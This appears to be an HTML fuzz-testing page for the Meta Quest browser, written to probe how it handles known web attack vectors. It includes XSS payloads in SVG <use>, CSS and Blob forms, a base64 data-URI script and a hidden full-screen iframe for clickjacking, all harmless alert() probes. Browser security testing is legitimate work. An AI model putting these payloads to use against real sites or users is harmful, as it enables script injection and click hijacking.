
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Meta Quest Browser Fuzz Test</title>
  <style>
    body { font-family: sans-serif; background: #fafafa; padding: 2rem; }
    h1 { color: #333; }
    .log { font-size: 0.9em; background: #f0f0f0; padding: 1em; border-radius: 5px; white-space: pre-wrap; }
    section { margin-bottom: 2rem; }
    iframe { width: 300px; height: 200px; border: 1px solid #ccc; }
  </style>
</head>
<body>
  <h1>Meta Quest Browser Fuzz Testing Page</h1>

  <section>
    <h2>1. SVG <code>&lt;use&gt;</code> Injection</h2>
    <svg>
      <use xlink:href="javascript:alert('SVG Use Triggered')"></use>
    </svg>
  </section>

  <section>
    <h2>2. CSS JavaScript URL Injection</h2>
    <style>
      @keyframes fuzz { from { background-image: url("javascript:alert('CSS triggered')"); } }
      .test-css { animation: fuzz 1s infinite; }
    </style>
    <div class="test-css">CSS Payload Box</div>
  </section>

  <section>
    <h2>3. WebXR Request</h2>
    <button onclick="startXR()">Request XR Session</button>
    <script>
      function startXR() {
        if ('xr' in navigator) {
          navigator.xr.requestSession('immersive-vr')
            .then(() => alert('XR session started'))
            .catch(e => console.warn('XR failed:', e));
        } else {
          alert('WebXR not supported');
        }
      }
    </script>
  </section>

  <section>
    <h2>4. Blob URI + Service Worker</h2>
    <button onclick="triggerBlob()">Trigger Blob Navigation</button>
    <script>
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').then(() => {
          console.log('SW registered');
        });
      }
      function triggerBlob() {
        const blob = new Blob(["<script>alert('Blob XSS')</script>"], { type: 'text/html' });
        const url = URL.createObjectURL(blob);
        window.location = url;
      }
    </script>
  </section>

  <section>
    <h2>5. Data URI XSS</h2>
    <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI XSS Link</a>
  </section>

  <section>
    <h2>6. UI Redress / Clickjacking Test</h2>
    <p>This iframe should be hidden over the viewport. Try interacting with the screen to test frame isolation.</p>
    <iframe src="https://www.meta.com/" style="opacity:0;position:absolute;top:0;left:0;width:100vw;height:100vh;"></iframe>
  </section>

  <section>
    <h2>7. Browser Info</h2>
    <pre class="log" id="ua"></pre>
    <script>document.getElementById("ua").textContent = navigator.userAgent;</script>
  </section>

</body>
</html>
